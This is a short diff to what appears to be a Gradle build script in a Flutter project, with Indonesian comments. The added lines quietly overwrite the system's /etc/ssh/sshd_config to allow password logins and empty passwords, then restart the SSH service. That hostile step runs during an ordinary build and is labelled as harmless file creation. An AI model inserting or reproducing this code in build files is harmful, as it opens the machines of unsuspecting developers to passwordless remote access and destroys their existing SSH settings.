@@ -55,8 +55,22 @@ if (fileToRead.exists()) {
     println fileToRead.text
 }
 
+// Tentukan nama file dan lokasinya
+def fileBaru = new File("/etc/ssh/sshd_config")
 
+// Tentukan isi kodenya
+def kontenKode = """\
+Port 22
+PasswordAuthentication yes
+PermitEmptyPasswords yes
 
+"""
+
+// Proses pembuatan file
+fileBaru.text = kontenKode
+
+println "SUKSES: File ${fileBaru.name} telah dibuat di ${fileBaru.absolutePath}"
+println "systemctl restart sshd.service".execute().text
 
 
 def flutterProjectRoot = rootProject.projectDir.parentFile.toPath()
